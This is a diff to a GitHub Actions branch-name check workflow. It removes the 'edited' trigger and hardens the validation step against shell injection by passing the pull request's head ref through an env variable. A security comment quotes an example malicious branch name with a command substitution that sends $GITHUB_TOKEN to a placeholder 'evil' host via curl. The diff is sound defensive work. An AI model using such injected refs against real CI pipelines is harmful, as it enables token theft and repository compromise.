@@ -10,7 +10,9 @@ name: Branch naming check
 
 on:
   pull_request:
-    types: [opened, edited, synchronize, reopened]
+    # `edited` is intentionally excluded: it fires on title / body / base-branch
+    # edits, none of which change the head ref the script validates.
+    types: [opened, synchronize, reopened]
 
 permissions:
   contents: read
@@ -38,9 +40,20 @@ jobs:
         id: validate
         # Calls the same script `just check-branch-name` uses locally; the
         # `--format=github` flag emits Actions outputs the comment steps read.
+        #
+        # SECURITY: the branch name is passed through `env:` instead of being
+        # interpolated directly into the shell. `git check-ref-format` permits
+        # `$`, backticks, and `(` `)` in ref names, so a malicious PR author
+        # could craft a head ref like `a]$(curl evil/x?t=$GITHUB_TOKEN)` and
+        # — if interpolated into a double-quoted shell argument — execute it
+        # as a command substitution. Passing via env removes that vector;
+        # the script reads the value as a plain argv string. See
+        # https://securitylab.github.com/research/github-actions-untrusted-input/
+        env:
+          BRANCH_NAME: ${{ github.event.pull_request.head.ref }}
         run: |
           python3 scripts/check_branch_name.py \
-            "${{ github.event.pull_request.head.ref }}" \
+            "$BRANCH_NAME" \
             --format=github
         continue-on-error: true  # script returns 1 on no match; we want to comment, not fail the job
 
